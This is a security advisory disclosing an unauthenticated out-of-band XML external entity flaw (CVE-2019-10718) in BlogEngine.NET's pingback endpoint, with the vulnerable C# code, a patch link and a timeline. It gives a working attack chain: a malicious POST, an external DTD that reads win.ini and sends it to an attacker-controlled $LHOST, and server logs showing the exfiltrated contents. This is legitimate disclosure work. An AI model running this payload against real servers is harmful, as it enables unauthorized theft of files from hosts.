An Out-of-band XML External Entity attack, CVE-2019-10718, exists on BlogEngine.NET versions 3.3.7 and earlier through the `/pingback.axd` endpoint.  This issue can be exploited to reveal the contents of files on the host. Authentication is not required.

## Vendor Patch

* https://github.com/rxtur/BlogEngine.NET/releases

## Timeline

* Identified: 30 Mar 2019
* Initial Developer Contact: 31 Mar 2019
* Issue Disclosed: 18 Jun 2019

## Description

The vulnerable code can be found here:

~~~{.cs command="PingbackHandler.cs"}
331:        private static XmlDocument RetrieveXmlDocument(HttpContext context)
332:        {
333:            var xml = ParseRequest(context);
334:            if (!xml.Contains("<methodName>pingback.ping</methodName>"))
335:            {
336:                context.Response.StatusCode = 404;
337:                context.Response.End();
338:            }
339:
340:            var doc = new XmlDocument();
341:            doc.LoadXml(xml);
342:            return doc;
343:        }
~~~

The string `<methodName>pingback.ping</methodName>` must appear in the body of the request; the XML resolver is not set so External Entities can be processed.

An unauthenticated user can submit a `POST` containing a malicious XML body such as:

~~~
POST /pingback.axd HTTP/1.1
Host: $RHOST
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 134

<?xml version="1.0"?>
    <!DOCTYPE foo SYSTEM "http://$LHOST/ex.dtd">
    <foo>&e1;</foo>
<methodName>pingback.ping</methodName>
~~~

<pagebreak></pagebreak>

The malicious XML instructs the parser to request a DTD (document type definition) from an external host:

~~~
$RHOST - - [01/Apr/2019:16:34:40 -0600] "GET /ex.dtd HTTP/1.1" 200 326 "-" "-"
~~~

The external DTD is then parsed and instructs the application to read a local file:

~~~{command="ex.dtd"}
<!ENTITY % p1 SYSTEM "file:///C:/WINDOWS/win.ini">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://$LHOST/EX?%p1;'>">
%p2;
~~~

The contents of the local file, `C:/WINDOWS/win.ini` in the example, are then sent in a subsequent request to the attacker:

~~~
$RHOST - - [01/Apr/2019:16:34:40 -0600] "GET /EX?;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1%0D%0A[MCI%20Extensions.BAK]%0D%0A3g2=MPEGVideo%0D%0A3gp=MPEGVideo%0D%0A3gp2=MPEGVideo%0D%0A3gpp=MPEGVideo%0D%0Aaac=MPEGVideo%0D%0Aadt=MPEGVideo%0D%0Aadts=MPEGVideo%0D%0Am2t=MPEGVideo%0D%0Am2ts=MPEGVideo%0D%0Am2v=MPEGVideo%0D%0Am4a=MPEGVideo%0D%0Am4v=MPEGVideo%0D%0Amod=MPEGVideo%0D%0Amov=MPEGVideo%0D%0Amp4=MPEGVideo%0D%0Amp4v=MPEGVideo%0D%0Amts=MPEGVideo%0D%0Ats=MPEGVideo%0D%0Atts=MPEGVideo HTTP/1.1" 404 438 "-" "-"
~~~

## Exploit

* <./exploit.py> 

Requests the contents of specified files (or `C:/Windows/win.ini` by default). It then writes the files to the current folder:

~~~{command="C_Windows_win.ini"}
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
~~~
